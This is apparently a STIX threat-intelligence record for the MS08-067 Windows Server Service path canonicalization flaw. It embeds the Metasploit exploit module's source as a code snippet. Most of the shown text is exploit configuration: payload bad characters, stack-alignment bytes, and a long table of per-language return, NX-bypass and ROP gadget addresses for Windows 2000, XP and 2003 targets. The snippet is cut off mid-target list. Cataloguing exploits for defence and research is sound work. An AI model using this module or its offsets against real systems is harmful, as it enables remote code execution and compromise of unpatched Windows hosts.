{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--551ae1d5-83a0-4a74-ba97-93fda18aad5e",
    "created": "2024-08-14T16:56:38.398817Z",
    "modified": "2024-08-14T16:56:38.398821Z",
    "name": "MS08-067 Microsoft Server Service Relative Path Stack Corruption",
    "description": " This module exploits a parsing flaw in the path canonicalization code of NetAPI32.dll through the Server Service. This module is capable of bypassing NX on some operating systems and service packs. The correct target must be used to prevent the Server Service (along with a dozen others in the same process) from crashing. Windows XP targets seem to handle multiple successful exploitation events, but 2003 targets will often crash or hang on subsequent attempts. This is just the first version of this module, full support for NX bypass on 2003, along with other platforms, is still in development. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/smb/ms08_067_netapi.rb",
            "external_id": "ms08_067_netapi.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/db/vulnerabilities/dcerpc-ms-netapi-netpathcanonicalize-dos/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::DCERPC\n  include Msf::Exploit::Remote::SMB::Client\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MS08-067 Microsoft Server Service Relative Path Stack Corruption',\n      'Description'    => %q{\n          This module exploits a parsing flaw in the path canonicalization code of\n        NetAPI32.dll through the Server Service. This module is capable of bypassing\n        NX on some operating systems and service packs. The correct target must be\n        used to prevent the Server Service (along with a dozen others in the same\n        process) from crashing. Windows XP targets seem to handle multiple successful\n        exploitation events, but 2003 targets will often crash or hang on subsequent\n        attempts. This is just the first version of this module, full support for\n        NX bypass on 2003, along with other platforms, is still in development.\n      },\n      'Author'         =>\n        [\n          'hdm', # with tons of input/help/testing from the community\n          'Brett Moore <brett.moore[at]insomniasec.com>',\n          'frank2 <frank2[at]dc949.org>', # check() detection\n          'jduck', # XP SP2/SP3 AlwaysOn DEP bypass\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          %w(CVE 2008-4250),\n          %w(OSVDB 49243),\n          %w(MSB MS08-067),\n          # If this vulnerability is found, ms08-67 is exposed as well\n          ['URL', 'https://www.rapid7.com/db/vulnerabilities/dcerpc-ms-netapi-netpathcanonicalize-dos/']\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'    => 408,\n          'BadChars' => \"\\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\\x40\",\n          'Prepend'  => \"\\x81\\xE4\\xF0\\xFF\\xFF\\xFF\", # stack alignment\n          'StackAdjustment' => -3500,\n\n        },\n      'Platform'       => 'win',\n      'DefaultTarget'  => 0,\n      'Targets'        =>\n        [\n          #\n          # Automatic targetting via fingerprinting\n          #\n          ['Automatic Targeting', { 'auto' => true }],\n\n          #\n          # UNIVERSAL TARGETS\n          #\n\n          #\n          # Antoine's universal for Windows 2000\n          # Warning: DO NOT CHANGE THE OFFSET OF THIS TARGET\n          #\n          ['Windows 2000 Universal',\n           {\n             'Ret'       => 0x001f1cb0,\n             'Scratch'   => 0x00020408,\n           }\n          ], # JMP EDI SVCHOST.EXE\n\n          #\n          # Standard return-to-ESI without NX bypass\n          # Warning: DO NOT CHANGE THE OFFSET OF THIS TARGET\n          #\n          ['Windows XP SP0/SP1 Universal',\n           {\n             'Ret'       => 0x01001361,\n             'Scratch'   => 0x00020408,\n           }\n          ], # JMP ESI SVCHOST.EXE\n\n          # Standard return-to-ESI without NX bypass\n          ['Windows 2003 SP0 Universal',\n           {\n             'Ret'       => 0x0100129e,\n             'Scratch'   => 0x00020408,\n           }\n          ], # JMP ESI SVCHOST.EXE\n\n          #\n          # ENGLISH TARGETS\n          #\n\n          # jduck's AlwaysOn NX Bypass for XP SP2\n          ['Windows XP SP2 English (AlwaysOn NX)',\n           {\n             # No pivot is needed, we drop into our rop\n             'Scratch' => 0x00020408,\n             'UseROP'  => '5.1.2600.2180'\n           }\n          ],\n\n          # Metasploit's NX bypass for XP SP2/SP3\n          ['Windows XP SP2 English (NX)',\n           {\n             'Ret'       => 0x6f88f727,\n             'DisableNX' => 0x6f8916e2,\n             'Scratch'   => 0x00020408\n           }\n          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL\n\n          # jduck's AlwaysOn NX Bypass for XP SP3\n          ['Windows XP SP3 English (AlwaysOn NX)',\n           {\n             # No pivot is needed, we drop into our rop\n             'Scratch' => 0x00020408,\n             'UseROP'  => '5.1.2600.5512'\n           }\n          ],\n\n          # Metasploit's NX bypass for XP SP2/SP3\n          ['Windows XP SP3 English (NX)',\n           {\n             'Ret'       => 0x6f88f807,\n             'DisableNX' => 0x6f8917c2,\n             'Scratch'   => 0x00020408\n           }\n          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL\n\n          #\n          # NON-ENGLISH TARGETS - AUTOMATICALLY GENERATED\n          #\n\n          # Metasploit's NX bypass for XP SP2/SP3\n          ['Windows XP SP2 Arabic (NX)',\n           {\n             'Ret'       => 0x6fd8f727,\n             'DisableNX' => 0x6fd916e2,\n             'Scratch'   => 0x00020408\n           }\n          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL\n\n          # Metasploit's NX bypass for XP SP2/SP3\n          ['Windows XP SP2 Chinese - Traditional / Taiwan (NX)',\n           {\n             'Ret'       => 0x5860f727,\n             'DisableNX' => 0x586116e2,\n             'Scratch'   => 0x00020408\n           }\n          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL\n\n          # Metasploit's NX bypass for XP SP2/SP3\n          ['Windows XP SP2 Chinese - Simplified (NX)',\n           {\n             'Ret'       => 0x58fbf727,\n             'DisableNX' => 0x58fc16e2,\n             'Scratch'   => 0x00020408\n           }\n          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL\n\n          # Metasploit's NX bypass for XP SP2/SP3\n          ['Windows XP SP2 Chinese - Traditional (NX)',\n           {\n             'Ret'       => 0x5860f727,\n             'DisableNX' => 0x586116e2,\n             'Scratch'   => 0x00020408\n           }\n          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL\n\n          # Metasploit's NX bypass for XP SP2/SP3\n          ['Windows XP SP2 Czech (NX)',\n           {\n             'Ret'       => 0x6fe1f727,\n             'DisableNX' => 0x6fe216e2,\n             'Scratch'   => 0x00020408\n           }\n          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL\n\n          # Metasploit's NX bypass for XP SP2/SP3\n          ['Windows XP SP2 Danish (NX)',\n           {\n             'Ret'       => 0x5978f727,\n             'DisableNX' => 0x597916e2,\n             'Scratch'   => 0x00020408\n           }\n          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL\n\n          # Metasploit's NX bypass for XP SP2/SP3\n          ['Windows XP SP2 German (NX)',\n           {\n             'Ret'       => 0x6fd9f727,\n             'DisableNX' => 0x6fda16e2,\n             'Scratch'   => 0x00020408\n           }\n          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL\n\n          # Metasploit's NX bypass for XP SP2/SP3\n          ['Windows XP SP2 Greek (NX)',\n           {\n             'Ret'       => 0x592af727,\n             'DisableNX' => 0x592b16e2,\n             'Scratch'   => 0x00020408\n           }\n          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL\n\n          # Metasploit's NX bypass for XP SP2/SP3\n          ['Windows XP SP2 Spanish (NX)',\n           {\n             'Ret'       => 0x6fdbf727,\n             'DisableNX' => 0x6fdc16e2,\n             'Scratch'   => 0x00020408\n           }\n          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL\n\n          # Metasploit's NX bypass for XP SP2/SP3\n          ['Windows XP SP2 Finnish (NX)',\n           {\n             'Ret'       => 0x597df727,\n             'DisableNX' => 0x597e16e2,\n             'Scratch'   => 0x00020408\n           }\n          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL\n\n          # Metasploit's NX bypass for XP SP2/SP3\n          ['Windows XP SP2 French (NX)',\n           {\n             'Ret'       => 0x595bf727,\n             'DisableNX' => 0x595c16e2,\n             'Scratch'   => 0x00020408\n           }\n          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL\n\n          # Metasploit's NX bypass for XP SP2/SP3\n          ['Windows XP SP2 Hebrew (NX)',\n           {\n             'Ret'       => 0x5940f727,\n             'DisableNX' => 0x594116e2,\n             'Scratch'   => 0x00020408\n           }\n          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL\n\n          # Metasploit's NX bypass for XP SP2/SP3\n          ['Windows XP SP2 Hungarian (NX)',\n           {\n             'Ret'       => 0x5970f727,\n             'DisableNX' => 0x597116e2,\n             'Scratch'   => 0x00020408\n           }\n          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL\n\n          # Metasploit's NX bypass for XP SP2/SP3\n          ['Windows XP SP2 Italian (NX)',\n           {\n             'Ret'       => 0x596bf727,\n             'DisableNX' => 0x596c16e2,\n             'Scratch'   => 0x00020408\n           }\n          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL\n\n          # Metasploit's NX bypass for XP SP2/SP3\n          ['Windows XP SP2 Japanese (NX)',\n           {\n             'Ret'       => 0x567fd3be,\n             'DisableNX' => 0x568016e2,\n             'Scratch'   => 0x00020408\n           }\n          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL\n\n          # Metasploit's NX bypass for XP SP2/SP3\n          ['Windows XP SP2 Korean (NX)',\n           {\n             'Ret'       => 0x6fd6f727,\n             'DisableNX' => 0x6fd716e2,\n             'Scratch'   => 0x00020408\n           }\n          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL\n\n          # Metasploit's NX bypass for XP SP2/SP3\n          ['Windows XP SP2 Dutch (NX)',\n           {\n             'Ret'       => 0x596cf727,\n             'DisableNX' => 0x596d16e2,\n             'Scratch'   => 0x00020408\n           }\n          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL\n\n          # Metasploit's NX bypass for XP SP2/SP3\n          ['Windows XP SP2 Norwegian (NX)',\n           {\n             'Ret'       => 0x597cf727,\n             'DisableNX' => 0x597d16e2,\n             'Scratch'   => 0x00020408\n           }\n          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL\n\n          # Metasploit's NX bypass for XP SP2/SP3\n          ['Windows XP SP2 Polish (NX)',\n           {\n             'Ret'       => 0x5941f727,\n             'DisableNX' => 0x594216e2,\n             'Scratch'   => 0x00020408\n           }\n          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL\n\n          # Metasploit's NX bypass for XP SP2/SP3\n          ['Windows XP SP2 Portuguese - Brazilian (NX)',\n           {\n             'Ret'       => 0x596ff727,\n             'DisableNX' => 0x597016e2,\n             'Scratch'   => 0x00020408\n           }\n          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL\n\n          # Metasploit's NX bypass for XP SP2/SP3\n          ['Windows XP SP2 Portuguese (NX)',\n           {\n             'Ret'       => 0x596bf727,\n             'DisableNX' => 0x596c16e2,\n             'Scratch'   => 0x00020408\n           }\n          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL\n\n          # Metasploit's NX bypass for XP SP2/SP3\n          ['Windows XP SP2 Russian (NX)',\n           {\n             'Ret'       => 0x6fe1f727,\n             'DisableNX' => 0x6fe216e2,\n             'Scratch'   => 0x00020408\n           }\n          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL\n\n          # Metasploit's NX bypass for XP SP2/SP3\n          ['Windows XP SP2 Swedish (NX)',\n           {\n             'Ret'       => 0x597af727,\n             'DisableNX' => 0x597b16e2,\n             'Scratch'   => 0x00020408\n           }\n          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL\n\n          # Metasploit's NX bypass for XP SP2/SP3\n          ['Windows XP SP2 Turkish (NX)',\n           {\n             'Ret'       => 0x5a78f727,\n             'DisableNX' => 0x5a7916e2,\n             'Scratch'   => 0x00020408\n           }\n          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL\n\n          # Metasploit's NX bypass for XP SP2/SP3\n          ['Windows XP SP3 Arabic (NX)',\n           {\n             'Ret'       => 0x6fd8f807,\n             'DisableNX' => 0x6fd917c2,\n             'Scratch'   => 0x00020408\n           }\n          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL\n\n          # Metasploit's NX bypass for XP SP2/SP3\n          ['Windows XP SP3 Chinese - Traditional / Taiwan (NX)',\n           {\n             'Ret'       => 0x5860f807,\n             'DisableNX' => 0x586117c2,\n             'Scratch'   => 0x00020408\n           }\n          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL\n\n          # Metasploit's NX bypass for XP SP2/SP3\n          ['Windows XP SP3 Chinese - Simplified (NX)',\n           {\n             'Ret'       => 0x58fbf807,\n             'DisableNX' => 0x58fc17c2,\n             'Scratch'   => 0x00020408\n           }\n          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL\n\n          # Metasploit's NX bypass for XP SP2/SP3\n          ['Windows XP SP3 Chinese - Traditional (NX)',\n           {\n             'Ret'       => 0x5860f807,\n             'DisableNX' => 0x586117c2,\n             'Scratch'   => 0x00020408\n           }\n          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL\n\n          # Metasploit's NX bypass for XP SP2/SP3\n          ['Windows XP SP3 Czech (NX)',\n           {\n             'Ret'       => 0x6fe1f807,\n             'DisableNX' => 0x6fe217c2,\n             'Scratch'   => 0x00020408\n           }\n          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL\n\n          # Metasploit's NX bypass for XP SP2/SP3\n          ['Windows XP SP3 Danish (NX)',\n           {\n             'Ret'       => 0x5978f807,\n             'DisableNX' => 0x597917c2,\n             'Scratch'   => 0x00020408\n           }\n          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL\n\n          # Metasploit's NX bypass for XP SP2/SP3\n          ['Windows XP SP3 German (NX)',\n           {\n             'Ret'       => 0x6fd9f807,\n             'DisableNX' => 0x6fda17c2,\n             'Scratch'   => 0x00020408\n           }\n          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL\n\n          # Metasploit's NX bypass for XP SP2/SP3\n          ['Windows XP SP3 Greek (NX)',\n           {\n             'Ret'       => 0x592af807,\n             'DisableNX' => 0x592b17c2,\n             'Scratch'   => 0x00020408\n           }\n          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL\n\n          # Metasploit's NX bypass for XP SP2/SP3\n          ['Windows XP SP3 Spanish (NX)',\n           {\n             'Ret'       => 0x6fdbf807,\n             'DisableNX' => 0x6fdc17c2,\n             'Scratch'   => 0x00020408\n           }\n          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL\n\n          # Metasploit's NX bypass for XP SP2/SP3\n          ['Windows XP SP3 Finnish (NX)',\n           {\n             'Ret'       => 0x597df807,\n             'DisableNX' => 0x597e17c2,\n             'Scratch'   => 0x00020408\n           }\n          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL\n\n          # Metasploit's NX bypass for XP SP2/SP3\n          ['Windows XP SP3 French (NX)',\n           {\n             'Ret'       => 0x595bf807,\n             'DisableNX' => 0x595c17c2,\n             'Scratch'   => 0x00020408\n           }\n          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL\n\n          # Metasploit's NX bypass for XP SP2/SP3\n          ['Windows XP SP3 Hebrew (NX)',\n           {\n             'Ret'       => 0x5940f807,\n             'DisableNX' => 0x594117c2,\n             'Scratch'   => 0x00020408\n           }\n          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL\n\n          # Metasploit's NX bypass for XP SP2/SP3\n          ['Windows XP SP3 Hungarian (NX)',\n           {\n             'Ret'       => 0x5970f807,\n             'DisableNX' => 0x597117c2,\n             'Scratch'   => 0x00020408\n           }\n          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL\n\n          # Metasploit's NX bypass for XP SP2/SP3\n          ['Windows XP SP3 Italian (NX)',\n           {\n             'Ret'       => 0x596bf807,\n             'DisableNX' => 0x596c17c2,\n             'Scratch'   => 0x00020408\n           }\n          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL\n\n          # Metasploit's NX bypass for XP SP2/SP3\n          ['Windows XP SP3 Japanese (NX)',\n           {\n             'Ret'       => 0x567fd4d2,\n             'DisableNX' => 0x568017c2,\n             'Scratch'   => 0x00020408\n           }\n          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL\n\n          # Metasploit's NX bypass for XP SP2/SP3\n          ['Windows XP SP3 Korean (NX)',\n           {\n             'Ret'       => 0x6fd6f807,\n             'DisableNX' => 0x6fd717c2,\n             'Scratch'   => 0x00020408\n           }\n          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL\n\n          # Metasploit's NX bypass for XP SP2/SP3\n          ['Windows XP SP3 Dutch (NX)',\n           {\n             'Ret'       => 0x596cf807,\n             'DisableNX' => 0x596d17c2,\n             'Scratch'   => 0x00020408\n           }\n          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL\n\n          # Metasploit's NX bypass for XP SP2/SP3\n          ['Windows XP SP3 Norwegian (NX)',\n           {\n             'Ret'       => 0x597cf807,\n             'DisableNX' => 0x597d17c2,\n             'Scratch'   => 0x00020408\n           }\n          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL\n\n          # Metasploit's NX bypass for XP SP2/SP3\n          ['Windows XP SP3 Polish (NX)',\n           {\n             'Ret'       => 0x5941f807,\n             'DisableNX' => 0x594217c2,\n             'Scratch'   => 0x00020408\n           }\n          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL\n\n          # Metasploit's NX bypass for XP SP2/SP3\n          ['Windows XP SP3 Portuguese - Brazilian (NX)',\n           {\n             'Ret'       => 0x596ff807,\n             'DisableNX' => 0x597017c2,\n             'Scratch'   => 0x00020408\n           }\n          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL\n\n          # Metasploit's NX bypass for XP SP2/SP3\n          ['Windows XP SP3 Portuguese (NX)',\n           {\n             'Ret'       => 0x596bf807,\n             'DisableNX' => 0x596c17c2,\n             'Scratch'   => 0x00020408\n           }\n          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL\n\n          # Metasploit's NX bypass for XP SP2/SP3\n          ['Windows XP SP3 Russian (NX)',\n           {\n             'Ret'       => 0x6fe1f807,\n             'DisableNX' => 0x6fe217c2,\n             'Scratch'   => 0x00020408\n           }\n          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL\n\n          # Metasploit's NX bypass for XP SP2/SP3\n          ['Windows XP SP3 Swedish (NX)',\n           {\n             'Ret'       => 0x597af807,\n             'DisableNX' => 0x597b17c2,\n             'Scratch'   => 0x00020408\n           }\n          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL\n\n          # Metasploit's NX bypass for XP SP2/SP3\n          ['Windows XP SP3 Turkish (NX)',\n           {\n             'Ret'       => 0x5a78f807,\n             'DisableNX' => 0x5a7917c2,\n             'Scratch'   => 0x00020408\n           }\n          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL\n\n          #\n          # Windows 2003 Targets\n          #\n\n          # Standard return-to-ESI without NX bypass\n          ['Windows 2003 SP1 English (NO NX)',\n           {\n             'Ret'       => 0x71bf21a2,\n             'Scratch'   => 0x00020408,\n           }\n          ], # JMP ESI WS2HELP.DLL\n\n          # Brett Moore's crafty NX bypass for 2003 SP1\n          ['Windows 2003 SP1 English (NX)',\n           {\n             'RetDec'    => 0x7c90568c,  # dec ESI, ret @SHELL32.DLL\n             'RetPop'    => 0x7ca27cf4,  # push ESI, pop EBP, ret @SHELL32.DLL\n             'JmpESP'    => 0x7c86fed3,  # jmp ESP @NTDLL.DLL\n             'DisableNX' => 0x7c83e413,  # NX disable @NTDLL.DLL\n             'Scratch'   => 0x00020408,\n           }\n          ],\n\n          # Standard return-to-ESI without NX bypass\n          ['Windows 2003 SP1 Japanese (NO NX)',\n           {\n             'Ret'       => 0x71a921a2,\n             'Scratch'   => 0x00020408,\n           }\n          ], # JMP ESI WS2HELP.DLL\n\n          # Standard return-to-ESI without NX bypass\n          ['Windows 2003 SP1 Spanish (NO NX)',\n           {\n             'Ret'       => 0x71ac21a2,\n             'Scratch'   => 0x00020408,\n           }\n          ], # JMP ESI WS2HELP.DLL\n\n          # Brett Moore's crafty NX bypass for 2003 SP1\n          ['Windows 2003 SP1 Spanish (NX)',\n           {\n             'RetDec'    => 0x7c90568c,  # dec ESI, ret @SHELL32.DLL\n             'RetPop'    => 0x7ca27cf4,  # push ESI, pop EBP, ret @SHELL32.DLL\n             'JmpESP'    => 0x7c86fed3,  # jmp ESP @NTDLL.DLL\n             'DisableNX' => 0x7c83e413,  # NX disable @NTDLL.DLL\n             'Scratch'   => 0x00020408,\n           }\n          ],\n          # Standard return-to-ESI without NX bypass\n          # Added by Omar MEZRAG - 0xFFFFFF\n          [ 'Windows 2003 SP1 French (NO NX)',\n            {\n              'Ret'       => 0x71ac1c40 ,\n              'Scratch'   => 0x00020408\n            }\n          ], # JMP ESI WS2HELP.DLL\n\n          # Brett Moore's crafty NX bypass for 2003 SP1\n          # Added by Omar MEZRAG - 0xFFFFFF\n          [ 'Windows 2003 SP1 French (NX)',\n            {\n              'RetDec'    => 0x7CA2568C,  # dec ESI, ret @SHELL32.DLL\n              'RetPop'    => 0x7CB47CF4,  # push ESI, pop EBP, ret 4 @SHELL32.DLL\n              'JmpESP'    => 0x7C98FED3,  # jmp ESP @NTDLL.DLL\n              'DisableNX' => 0x7C95E413,  # NX disable @NTDLL.DLL\n              'Scratch'   => 0x00020408\n            }\n          ],\n\n          # Standard return-to-ESI without NX bypass\n          ['Windows 2003 SP2 English (NO NX)',\n           {\n             'Ret'       => 0x71bf3969,\n             'Scratch'   => 0x00020408,\n           }\n          ], # JMP ESI WS2HELP.DLL\n\n          # Brett Moore's crafty NX bypass for 2003 SP2\n          ['Windows 2003 SP2 English (NX)',\n           {\n             'RetDec'    => 0x7c86beb8,  # dec ESI, ret @NTDLL.DLL\n             'RetPop'    => 0x7ca1e84e,  # push ESI, pop EBP, ret @SHELL32.DLL\n             'JmpESP'    => 0x7c86a01b,  # jmp ESP @NTDLL.DLL\n             'DisableNX' => 0x7c83f517,  # NX disable @NTDLL.DLL\n             'Scratch'   => 0x00020408,\n           }\n          ],\n\n          # Standard return-to-ESI without NX bypass\n          ['Windows 2003 SP2 German (NO NX)',\n           {\n             'Ret'       => 0x71a03969,\n             'Scratch'   => 0x00020408,\n           }\n          ], # JMP ESI WS2HELP.DLL\n\n          # Brett Moore's crafty NX bypass for 2003 SP2\n          ['Windows 2003 SP2 German (NX)',\n           {\n             'RetDec'    => 0x7c98beb8,  # dec ESI, ret @NTDLL.DLL\n             'RetPop'    => 0x7cb3e84e,  # push ESI, pop EBP, ret @SHELL32.DLL\n             'JmpESP'    => 0x7c98a01b,  # jmp ESP @NTDLL.DLL\n             'DisableNX' => 0x7c95f517,  # NX disable @NTDLL.DLL\n             'Scratch'   => 0x00020408,\n           }\n          ],\n\n          # Brett Moore's crafty NX bypass for 2003 SP2\n          [ 'Windows 2003 SP2 Portuguese (NX)',\n            {\n              'RetDec'    => 0x7c97beb8,  # dec ESI, ret @NTDLL.DLL OK\n              'RetPop'    => 0x7cb2e84e,  # push ESI, pop EBP, ret @SHELL32.DLL OK\n              'JmpESP'    => 0x7c97a01b,  # jmp ESP @NTDLL.DLL OK\n              'DisableNX' => 0x7c94f517,  # NX disable @NTDLL.DLL\n              'Scratch'   => 0x00020408,\n            }\n          ],\n\n          # Brett Moore's crafty NX bypass for 2003 SP2 (target by Anderson Bargas)\n          [ 'Windows 2003 SP2 Portuguese - Brazilian (NX)',\n            {\n              'RetDec'    => 0x7c97beb8,  # dec ESI, ret @NTDLL.DLL OK\n              'RetPop'    => 0x7cb2e84e,  # push ESI, pop EBP, ret @SHELL32.DLL OK\n              'JmpESP'    => 0x7c97a01b,  # jmp ESP @NTDLL.DLL OK\n              'DisableNX' => 0x7c94f517,  # NX disable @NTDLL.DLL\n              'Scratch'   => 0x00020408,\n            }\n          ],\n\n          # Standard return-to-ESI without NX bypass\n          ['Windows 2003 SP2 Spanish (NO NX)',\n           {\n             'Ret'       => 0x71ac3969,\n             'Scratch'   => 0x00020408,\n           }\n          ], # JMP ESI WS2HELP.DLL\n\n          # Brett Moore's crafty NX bypass for 2003 SP2\n          ['Windows 2003 SP2 Spanish (NX)',\n           {\n             'RetDec'    => 0x7c86beb8,  # dec ESI, ret @NTDLL.DLL\n             'RetPop'    => 0x7ca1e84e,  # push ESI, pop EBP, ret @SHELL32.DLL\n             'JmpESP'    => 0x7c86a01b,  # jmp ESP @NTDLL.DLL\n             'DisableNX' => 0x7c83f517,  # NX disable @NTDLL.DLL\n             'Scratch'   => 0x00020408,\n           }\n          ],\n\n          # Standard return-to-ESI without NX bypass\n          # Provided by Masashi Fujiwara\n          ['Windows 2003 SP2 Japanese (NO NX)',\n           {\n             'Ret'       => 0x71a91ed2,\n             'Scratch'   => 0x00020408\n           }\n          ], # JMP ESI WS2HELP.DLL\n\n          # Standard return-to-ESI without NX bypass\n          # Added by Omar MEZRAG - 0xFFFFFF\n          [ 'Windows 2003 SP2 French (NO NX)',\n            {\n              'Ret'       => 0x71AC2069,\n              'Scratch'   => 0x00020408\n            }\n          ], # CALL ESI WS2HELP.DLL\n\n          # Brett Moore's crafty NX bypass for 2003 SP2\n          # Added by Omar MEZRAG - 0xFFFFFF\n          [ 'Windows 2003 SP2 French (NX)',\n            {\n              'RetDec'    => 0x7C98BEB8,  # dec ESI, ret @NTDLL.DLL\n              'RetPop'    => 0x7CB3E84E,  # push ESI, pop EBP, ret @SHELL32.DLL\n              'JmpESP'    => 0x7C98A01B,  # jmp ESP @NTDLL.DLL\n              'DisableNX' => 0x7C95F517,  # NX disable @NTDLL.DLL\n              'Scratch'   => 0x00020408\n            }\n          ],\n\n          # Brett Moore's crafty NX bypass for 2003 SP2\n          [ 'Windows 2003 SP2 Chinese - Simplified (NX)',\n            {\n              'RetDec'    => 0x7c99beb8,  # dec ESI, ret @NTDLL.DLL\n              'RetPop'    => 0x7cb5e84e,  # push ESI, pop EBP, ret @SHELL32.DLL\n              'JmpESP'    => 0x7c99a01b,  # jmp ESP @NTDLL.DLL\n              'DisableNX' => 0x7c96f517,  # NX disable @NTDLL.DLL\n              'Scratch'   => 0x00020408,\n            }\n          ],\n\n          # Brett Moore's crafty NX bypass for 2003 SP2\n          [ 'Windows 2003 SP2 Czech (NX)',\n            {\n              'RetDec'    => 0x7c97beb8,  # dec ESI, ret @NTDLL.DLL\n              'RetPop'    => 0x7cb1e84e,  # push ESI, pop EBP, ret @SHELL32.DLL\n              'JmpESP'    => 0x7c97a01b,  # jmp ESP @NTDLL.DLL\n              'DisableNX' => 0x7c94f517,  # NX disable @NTDLL.DLL\n              'Scratch'   => 0x00020408,\n            }\n          ],\n\n          # Brett Moore's crafty NX bypass for 2003 SP2\n          [ 'Windows 2003 SP2 Dutch (NX)',\n            {\n              'RetDec'    => 0x7c97beb8,  # dec ESI, ret @NTDLL.DLL\n              'RetPop'    => 0x7cb2e84e,  # push ESI, pop EBP, ret @SHELL32.DLL\n              'JmpESP'    => 0x7c97a01b,  # jmp ESP @NTDLL.DLL\n              'DisableNX' => 0x7c94f517,  # NX disable @NTDLL.DLL\n              'Scratch'   => 0x00020408,\n            }\n          ],\n\n          # Brett Moore's crafty NX bypass for 2003 SP2\n          [ 'Windows 2003 SP2 Hungarian (NX)',\n            {\n              'RetDec'    => 0x7c97beb8,  # dec ESI, ret @NTDLL.DLL\n              'RetPop'    => 0x7cb2e84e,  # push ESI, pop EBP, ret @SHELL32.DLL\n              'JmpESP'    => 0x7c97a01b,  # jmp ESP @NTDLL.DLL\n              'DisableNX' => 0x7c94f517,  # NX disable @NTDLL.DLL\n              'Scratch'   => 0x00020408,\n            }\n          ],\n\n          # Brett Moore's crafty NX bypass for 2003 SP2\n          [ 'Windows 2003 SP2 Italian (NX)',\n            {\n              'RetDec'    => 0x7c97beb8,  # dec ESI, ret @NTDLL.DLL\n              'RetPop'    => 0x7cb2e84e,  # push ESI, pop EBP, ret @SHELL32.DLL\n              'JmpESP'    => 0x7c97a01b,  # jmp ESP @NTDLL.DLL\n              'DisableNX' => 0x7c94f517,  # NX disable @NTDLL.DLL\n              'Scratch'   => 0x00020408,\n            }\n          ],\n\n          # Brett Moore's crafty NX bypass for 2003 SP2\n          [ 'Windows 